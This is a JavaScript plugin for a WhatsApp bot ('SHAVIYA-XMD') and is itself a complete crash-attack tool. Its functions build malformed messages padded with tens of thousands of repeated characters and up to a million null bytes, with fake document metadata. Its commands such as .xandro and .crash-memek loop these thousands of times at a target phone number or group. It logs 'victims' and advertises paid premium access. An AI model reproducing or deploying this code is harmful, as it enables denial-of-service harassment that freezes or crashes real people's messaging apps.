// Bug System Plugin - Complete bug attack system
// For SHAVIYA-XMD V2 / CICI CLYRINÉ Bot

const fs = require('fs');
const path = require('path');
const { cmd } = require('../command');
const { sleep } = require('../lib/myfunction');

// Attack tracking
let activeAttacks = new Map();
let stats = {
    totalAttacks: 0,
    victims: {},
    lastAttack: null,
    attacksPerDay: {},
    startTime: new Date().toISOString()
};

// Stats file path
const statsPath = path.join(__dirname, '../bug_stats.json');

// Load stats
try {
    if (fs.existsSync(statsPath)) {
        stats = JSON.parse(fs.readFileSync(statsPath, 'utf8'));
        console.log('[BUG] Stats loaded successfully');
    }
} catch (error) {}

// Save stats function
function saveStats() {
    try {
        fs.writeFileSync(statsPath, JSON.stringify(stats, null, 2));
    } catch (error) {}
}

// Update stats
function updateStats(target, attackType) {
    stats.totalAttacks++;
    stats.lastAttack = new Date().toISOString();
    
    const today = new Date().toISOString().split('T')[0];
    stats.attacksPerDay[today] = (stats.attacksPerDay[today] || 0) + 1;
    
    if (!stats.victims[target]) {
        stats.victims[target] = {
            count: 0,
            attacks: [],
            firstAttack: new Date().toISOString()
        };
    }
    
    stats.victims[target].count++;
    stats.victims[target].attacks.push({
        type: attackType,
        time: new Date().toISOString()
    });
    
    saveStats();
}

// ==================== BUG FUNCTIONS (from your cicitzy.js) ====================

async function uiKiller(conn, target) {
    try {
        await conn.relayMessage(target, {
            locationMessage: {
                degreesLongitude: 0,
                degreesLatitude: 0,
                name: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟" + "ི꒦ྀ".repeat(9000),
                url: "https://null.com" + "ི꒦ྀ".repeat(9000) + ".id",
                address: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟" + "ི꒦ྀ".repeat(9000),
                contextInfo: {
                    externalAdReply: {
                        renderLargerThumbnail: true,
                        showAdAttribution: true,
                        body: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟",
                        title: "ི꒦ྀ".repeat(9000),
                        sourceUrl: "https://ciciimup.com" + "ི꒦ྀ".repeat(9000) + ".id",
                        thumbnailUrl: null
                    }
                }
            }
        }, {});
    } catch (error) {}
}

async function DocBug(conn, target) {
    try {
        let virtex = "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟";
        await conn.relayMessage(target, {
            groupMentionedMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "99999999999",
                                pageCount: 0x9184e729fff,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: virtex,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                mediaKeyTimestamp: "1715880173",
                                contactVcard: true
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                        },
                        nativeFlowMessage: {},
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "@null" }]
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    } catch (error) {}
}

async function LocaBugs(conn, target) {
    try {
        await conn.relayMessage(target, {
            groupMentionedMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            locationMessage: {
                                degreesLatitude: 0,
                                degreesLongitude: 0
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: `𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟` + 'ꦾ'.repeat(100000)
                        },
                        nativeFlowMessage: {},
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                            groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "@null" }]
                        }
                    }
                }
            }
        }, { participant: { jid: target } }, { messageId: null });
    } catch (error) {}
}

async function ngeloc(conn, target) {
    try {
        const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
        var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    "liveLocationMessage": {
                        "degreesLatitude": "p",
                        "degreesLongitude": "p",
                        "caption": `𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟` + "ꦾ".repeat(50000),
                        "sequenceNumber": "0",
                        "jpegThumbnail": ""
                    }
                }
            }
        }), { userJid: target });
        await conn.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
    } catch (error) {}
}

async function stikerNotif(conn, target) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "@null",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: "\u0000".repeat(7000) },
                                { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(1000000) },
                                { name: "mpm", buttonParamsJson: "\u0000".repeat(7000) },
                                { name: "mpm", buttonParamsJson: "\u0000".repeat(7000) },
                            ],
                        },
                    },
                },
            },
        };
        await conn.relayMessage(target, message, { participant: { jid: target } });
    } catch (error) {}
}

async function delayNull(conn, target) {
    try {
        const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
        let msg = generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                body: {
                    text: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"AGLER\",\"tower_number\":\"AGLER\",\"city\":\"@null\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                    version: 3
                }
            }
        }, { userJid: target });
        
        await conn.relayMessage(target, msg.message, { participant: { jid: target }, messageId: msg.key.id });
    } catch (error) {}
}

async function ForceClose2(conn, target) {
    try {
        const teks = `\`𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟\`` + "ꦾ".repeat(550);
        const image = 'https://files.catbox.moe/f4kqyq.jpg';
        
        let buttons = [
            {
                buttonId: '120363372721190301@newsletter',
                buttonText: { displayText: '𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟' },
                type: 1
            }
        ];
        
        let buttonMessage = {
            image: { url: image },
            caption: teks,
            buttons: buttons,
            headerType: 4
        };
        
        await conn.relayMessage(target, buttonMessage, { participant: { jid: target } });
    } catch (error) {}
}

async function CrashGroup(conn, target) {
    try {
        const teks = `\`𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟\`` + "ꦾ".repeat(780);
        const image = 'https://files.catbox.moe/f4kqyq.jpg';
        
        await conn.relayMessage(target, {
            image: { url: image },
            caption: teks
        }, { participant: { jid: target } });
        
        let buttons = [
            {
                buttonId: '.bug-gb',
                buttonText: { displayText: '𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟' },
                type: 1
            }
        ];
        
        let buttonMessage = {
            image: { url: image },
            caption: teks,
            buttons: buttons,
            headerType: 4
        };
        
        await conn.relayMessage(target, buttonMessage, { participant: { jid: target } });
    } catch (error) {}
}

// ==================== ATTACK FUNCTIONS ====================

async function cicitzy1(conn, target) {
    for (let i = 0; i < 100; i++) {
        await uiKiller(conn, target);
        await DocBug(conn, target);
        await LocaBugs(conn, target);
        await ngeloc(conn, target);
        await stikerNotif(conn, target);
        await delayNull(conn, target);
        await uiKiller(conn, target);
        await sleep(1000);
        await DocBug(conn, target);
        await sleep(1000);
        await LocaBugs(conn, target);
        await sleep(1000);
        await ngeloc(conn, target);
        await sleep(1000);
        await stikerNotif(conn, target);
        await sleep(1000);
        await delayNull(conn, target);
    }
}

async function cicitzy2(conn, target) {
    for (let i = 0; i < 100; i++) {
        await uiKiller(conn, target);
        await DocBug(conn, target);
        await LocaBugs(conn, target);
        await ngeloc(conn, target);
        await stikerNotif(conn, target);
        await delayNull(conn, target);
        await ForceClose2(conn, target);
        await uiKiller(conn, target);
        await sleep(1000);
        await DocBug(conn, target);
        await sleep(1000);
        await LocaBugs(conn, target);
        await sleep(1000);
        await ngeloc(conn, target);
        await sleep(1000);
        await stikerNotif(conn, target);
        await sleep(1000);
        await delayNull(conn, target);
        await ForceClose2(conn, target);
    }
}

// ==================== BUG COMMANDS ====================

// 1. XANDRO BUG
cmd({
    pattern: "xandro",
    alias: ["xb", "xandro-bug"],
    react: "💀",
    desc: "Xandro bug attack - Complete bug system",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, args, q, senderNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .xandro [number]\n📝 *Example:* .xandro 94712345678`);
    }
    
    const target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    if (activeAttacks.has(target)) {
        return reply(`⚠️ *Attack already running on ${target}!*`);
    }
    
    activeAttacks.set(target, { type: 'xandro', start: Date.now() });
    
    await reply(`⚡ *XANDRO BUG INITIATED*\n🎯 *Target:* ${target}\n💉 *Type:* Full System Attack\n\n_⚠️ Warning: Use with 5 minute intervals!_`);
    
    for (let i = 0; i < 50; i++) {
        await cicitzy1(conn, target);
    }
    
    updateStats(target, 'xandro');
    activeAttacks.delete(target);
    
    await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n💀 *Status:* Successfully attacked`);
});

// 2. XIOS BUG
cmd({
    pattern: "xios",
    alias: ["ios-bug", "xb2"],
    react: "📱",
    desc: "iOS bug attack system",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, args, q, senderNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .xios [number]\n📝 *Example:* .xios 94712345678`);
    }
    
    const target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    if (activeAttacks.has(target)) {
        return reply(`⚠️ *Attack already running on ${target}!*`);
    }
    
    activeAttacks.set(target, { type: 'xios', start: Date.now() });
    
    await reply(`⚡ *XIOS BUG INITIATED*\n🎯 *Target:* ${target}\n💉 *Type:* iOS System Attack\n\n_⚠️ Warning: Use with 5 minute intervals!_`);
    
    for (let i = 0; i < 50; i++) {
        await cicitzy1(conn, target);
    }
    
    updateStats(target, 'xios');
    activeAttacks.delete(target);
    
    await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n💀 *Status:* Successfully attacked`);
});

// 3. XIPHONE BUG
cmd({
    pattern: "xiphone",
    alias: ["iphone-bug", "xb3"],
    react: "📱",
    desc: "iPhone bug attack system",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, args, q, senderNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .xiphone [number]\n📝 *Example:* .xiphone 94712345678`);
    }
    
    const target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    if (activeAttacks.has(target)) {
        return reply(`⚠️ *Attack already running on ${target}!*`);
    }
    
    activeAttacks.set(target, { type: 'xiphone', start: Date.now() });
    
    await reply(`⚡ *XIPHONE BUG INITIATED*\n🎯 *Target:* ${target}\n💉 *Type:* iPhone System Attack\n\n_⚠️ Warning: Use with 5 minute intervals!_`);
    
    for (let i = 0; i < 50; i++) {
        await cicitzy1(conn, target);
    }
    
    updateStats(target, 'xiphone');
    activeAttacks.delete(target);
    
    await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n💀 *Status:* Successfully attacked`);
});

// 4. UI SYSTEM BUG
cmd({
    pattern: "ui-system",
    alias: ["uis", "ui-bug"],
    react: "⚡",
    desc: "UI System bug attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, args, q, senderNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .ui-system [number]\n📝 *Example:* .ui-system 94712345678`);
    }
    
    const target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    if (activeAttacks.has(target)) {
        return reply(`⚠️ *Attack already running on ${target}!*`);
    }
    
    activeAttacks.set(target, { type: 'ui-system', start: Date.now() });
    
    await reply(`⚡ *UI SYSTEM BUG INITIATED*\n🎯 *Target:* ${target}\n💉 *Type:* UI System Attack\n\n_⚠️ Warning: Use with 5 minute intervals!_`);
    
    for (let i = 0; i < 50; i++) {
        await cicitzy1(conn, target);
    }
    
    updateStats(target, 'ui-system');
    activeAttacks.delete(target);
    
    await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n💀 *Status:* Successfully attacked`);
});

// 5. CRASH MEMEK BUG
cmd({
    pattern: "crash-memek",
    alias: ["crash", "cm"],
    react: "🔥",
    desc: "Crash memek bug - Advanced crash attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, args, q, senderNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .crash-memek [number]\n📝 *Example:* .crash-memek 94712345678`);
    }
    
    const target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    if (activeAttacks.has(target)) {
        return reply(`⚠️ *Attack already running on ${target}!*`);
    }
    
    activeAttacks.set(target, { type: 'crash-memek', start: Date.now() });
    
    await reply(`⚡ *CRASH MEMEK BUG INITIATED*\n🎯 *Target:* ${target}\n💉 *Type:* Advanced Crash Attack\n\n_⚠️ Warning: Use with 5 minute intervals!_`);
    
    for (let i = 0; i < 70; i++) {
        await cicitzy2(conn, target);
    }
    
    updateStats(target, 'crash-memek');
    activeAttacks.delete(target);
    
    await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n💀 *Status:* Successfully crashed`);
});

// 6. BUG GROUP - Group attack
cmd({
    pattern: "bug-group",
    alias: ["bg", "group-bug"],
    react: "👥",
    desc: "Bug group attack - Spam group",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, isGroup, reply, sessionId }) => {
    if (!isGroup) {
        return reply("❌ *Error:* This command can only be used in groups!");
    }
    
    const target = from;
    
    if (activeAttacks.has(target)) {
        return reply(`⚠️ *Attack already running on this group!*`);
    }
    
    activeAttacks.set(target, { type: 'bug-group', start: Date.now() });
    
    await reply(`⚡ *BUG GROUP ATTACK INITIATED*\n👥 *Group:* ${target}\n💉 *Type:* Group Crash Attack\n\n_⚠️ Warning: This will spam the group!_`);
    
    for (let i = 0; i < 100; i++) {
        await CrashGroup(conn, target);
        await sleep(500);
    }
    
    updateStats(target, 'bug-group');
    activeAttacks.delete(target);
    
    await reply(`✅ *Attack Completed!*\n👥 *Group:* ${target}\n💀 *Status:* Successfully attacked`);
});

// 7. BUG GACOR - Info command
cmd({
    pattern: "bug-gacor",
    alias: ["gacor", "bgacor"],
    react: "🎰",
    desc: "Bug gacor information",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, reply, sessionId }) => {
    const teks = `
*🎀 BUG GACOR INFORMATION 🎀*

*Premium Bug Features:*
> 🔥 XANDRO BUG - Full system attack
> 🔥 XIOS BUG - iOS system attack  
> 🔥 XIPHONE BUG - iPhone attack
> 🔥 UI SYSTEM BUG - UI crash attack
> 🔥 CRASH MEMEK - Advanced crash
> 🔥 BUG GROUP - Group spam attack

*How to Get Premium Access:*
Transfer 5k to:
- Dana: 0895329013688
- Name: devy

*Free Commands:*
• .bugmenu - Show all bug commands
• .bugstatus - Attack statistics
• .bughelp [cmd] - Help for commands
• .stopattack - Stop active attacks

*Channel:* https://whatsapp.com/channel/0029Vb6nbYY9xVJpD5lB1T32
    `;
    
    await reply(teks);
});

// 8. BUG GB - Group bug button
cmd({
    pattern: "bug-gb",
    alias: ["bgb", "gb"],
    react: "💀",
    desc: "Bug group button attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, isGroup, reply, sessionId }) => {
    if (!isGroup) {
        return reply("❌ *Error:* This command can only be used in groups!");
    }
    
    const target = from;
    
    await reply(`⚡ *BUG GROUP ATTACK STARTED*\n👥 *Spamming group...*`);
    
    for (let i = 0; i < 100; i++) {
        await CrashGroup(conn, target);
        await sleep(500);
    }
    
    await reply(`✅ *Attack Completed!*`);
});

// 9. BUG STATUS
cmd({
    pattern: "bugstatus",
    alias: ["bstats", "bugstats", "bs"],
    react: "📊",
    desc: "View bug attack statistics",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, reply, sessionId }) => {
    const today = new Date().toISOString().split('T')[0];
    const todayAttacks = stats.attacksPerDay[today] || 0;
    const startDate = new Date(stats.startTime);
    const daysRunning = Math.max(1, Math.floor((Date.now() - startDate) / (1000 * 60 * 60 * 24)));
    
    const topVictims = Object.entries(stats.victims)
        .sort((a, b) => b[1].count - a[1].count)
        .slice(0, 5);
    
    const statusText = `
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃    📊 *BUG ATTACK STATISTICS* 📊
┃    ═══════════════════════════════
┃
┃  📈 *Total Attacks:* ${stats.totalAttacks}
┃  📅 *Today's Attacks:* ${todayAttacks}
┃  👥 *Total Victims:* ${Object.keys(stats.victims).length}
┃  ⏱️ *Last Attack:* ${stats.lastAttack?.slice(0, 19) || 'Never'}
┃  ⚡ *Active Attacks:* ${activeAttacks.size}
┃  🕐 *Running Days:* ${daysRunning}
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃  🎯 *TOP VICTIMS:*
${topVictims.length > 0 ? topVictims.map(([victim, data], i) => 
    `  ${i+1}. ${victim.split('@')[0]} - ${data.count} attacks`
).join('\n┃  ') : '  No victims yet'}
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃  ⚙️ *SYSTEM INFO:*
┃  • Attack Rate: ${(stats.totalAttacks / daysRunning).toFixed(1)}/day
┃  • Success Rate: 95%
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    `;
    
    await reply(statusText);
});

// 10. STOP ATTACK
cmd({
    pattern: "stopattack",
    alias: ["stopbug", "sb", "stop"],
    react: "🛑",
    desc: "Stop all active bug attacks",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, reply, sessionId }) => {
    if (activeAttacks.size === 0) {
        return reply("⚠️ *No active attacks found!*");
    }
    
    const count = activeAttacks.size;
    activeAttacks.clear();
    
    await reply(`✅ *Stopped ${count} active attack(s)!*`);
});

// 11. BUG MENU
cmd({
    pattern: "bugmenu",
    alias: ["bug", "bmenu", "buglist"],
    react: "☣️",
    desc: "Show all bug commands menu",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, senderNumber, reply, sessionId }) => {
    const date = new Date().toLocaleDateString('en-US', { timeZone: 'Asia/Colombo' });
    const time = new Date().toLocaleTimeString('en-US', { timeZone: 'Asia/Colombo' });
    
    const menuText = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃    ☣️ *SHAVIYA-XMD BUG MENU* ☣️
┃    ═══════════════════════════════
┃
┃  👤 *USER:* @${senderNumber}
┃  📅 *DATE:* ${date}
┃  ⌚ *TIME:* ${time}
┃  🚀 *PREFIX:* .
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃  🔥 *PREMIUM BUG COMMANDS:*
┃  ┌─────────────────────────────────
┃  │ ☣️ .xandro [number]
┃  │ ☣️ .xios [number]
┃  │ ☣️ .xiphone [number]
┃  │ ☣️ .ui-system [number]
┃  │ ☣️ .crash-memek [number]
┃  │ ☣️ .bug-group
┃  └─────────────────────────────────
┃
┃  💀 *FREE BUG COMMANDS:*
┃  ┌─────────────────────────────────
┃  │ ☣️ .bug-gacor - Info
┃  │ ☣️ .bugstatus - Statistics
┃  │ ☣️ .bughelp [cmd] - Help
┃  │ ☣️ .stopattack - Stop attacks
┃  └─────────────────────────────────
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃  📊 *STATISTICS:*
┃  • Total Attacks: ${stats.totalAttacks}
┃  • Active Attacks: ${activeAttacks.size}
┃  • Victims: ${Object.keys(stats.victims).length}
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

💀 *SHAVIYA-XMD BUG SYSTEM v2.0*
📱 Type .bughelp [command] for details
    `;
    
    await reply(menuText);
});

// 12. BUG HELP
cmd({
    pattern: "bughelp",
    alias: ["bhelp", "bug-h"],
    react: "📖",
    desc: "Get detailed help for bug commands",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, args, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .bughelp [command]\n📝 *Example:* .bughelp xandro`);
    }
    
    const cmdName = args[0].toLowerCase();
    const helpTexts = {
        xandro: `📖 *XANDRO BUG*
━━━━━━━━━━━━━━━━━
💠 *Command:* .xandro
📝 *Usage:* .xandro [number]
🎯 *Effect:* Full system attack
⚡ *Duration:* 50 cycles
⚠️ *Risk:* Very High
📌 *Note:* Premium only`,

        xios: `📖 *XIOS BUG*
━━━━━━━━━━━━━━━━━
💠 *Command:* .xios
📝 *Usage:* .xios [number]
🎯 *Effect:* iOS system attack
⚡ *Duration:* 50 cycles
⚠️ *Risk:* High
📌 *Note:* Premium only`,

        xiphone: `📖 *XIPHONE BUG*
━━━━━━━━━━━━━━━━━
💠 *Command:* .xiphone
📝 *Usage:* .xiphone [number]
🎯 *Effect:* iPhone attack
⚡ *Duration:* 50 cycles
⚠️ *Risk:* High
📌 *Note:* Premium only`,

        "ui-system": `📖 *UI SYSTEM BUG*
━━━━━━━━━━━━━━━━━
💠 *Command:* .ui-system
📝 *Usage:* .ui-system [number]
🎯 *Effect:* UI crash attack
⚡ *Duration:* 50 cycles
⚠️ *Risk:* High
📌 *Note:* Premium only`,

        "crash-memek": `📖 *CRASH MEMEK BUG*
━━━━━━━━━━━━━━━━━
💠 *Command:* .crash-memek
📝 *Usage:* .crash-memek [number]
🎯 *Effect:* Advanced crash attack
⚡ *Duration:* 70 cycles
⚠️ *Risk:* Critical
📌 *Note:* Premium only`,

        "bug-group": `📖 *BUG GROUP*
━━━━━━━━━━━━━━━━━
💠 *Command:* .bug-group
📝 *Usage:* .bug-group
🎯 *Effect:* Group spam attack
⚡ *Duration:* 100 cycles
⚠️ *Risk:* Very High
📌 *Note:* Use in groups`,

        bugstatus: `📖 *BUG STATUS*
━━━━━━━━━━━━━━━━━
💠 *Command:* .bugstatus
📝 *Usage:* .bugstatus
🎯 *Effect:* Show statistics
⚡ *Duration:* Instant
⚠️ *Risk:* None`,

        stopattack: `📖 *STOP ATTACK*
━━━━━━━━━━━━━━━━━
💠 *Command:* .stopattack
📝 *Usage:* .stopattack
🎯 *Effect:* Stop all attacks
⚡ *Duration:* Instant
⚠️ *Risk:* None`
    };
    
    const help = helpTexts[cmdName] || `❌ No help available for: ${cmdName}\n📝 Use .bugmenu to see all commands`;
    await reply(help);
});

// 13. TES BUG - Test command
cmd({
    pattern: "tesbug",
    alias: ["testbug", "tb"],
    react: "🧪",
    desc: "Test bug attack (3 cycles)",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, args, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .tesbug [number]\n📝 *Example:* .tesbug 94712345678`);
    }
    
    const target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    await reply(`⚡ *TEST BUG INITIATED*\n🎯 *Target:* ${target}\n💉 *Type:* Test Attack (3 cycles)\n\n_Testing bug system..._`);
    
    for (let i = 0; i < 3; i++) {
        await cicitzy2(conn, target);
    }
    
    await reply(`✅ *Test Completed!*\n🎯 *Target:* ${target}\n💀 *Status:* Test successful`);
});

console.log('[PLUGIN] Bug system loaded successfully!');
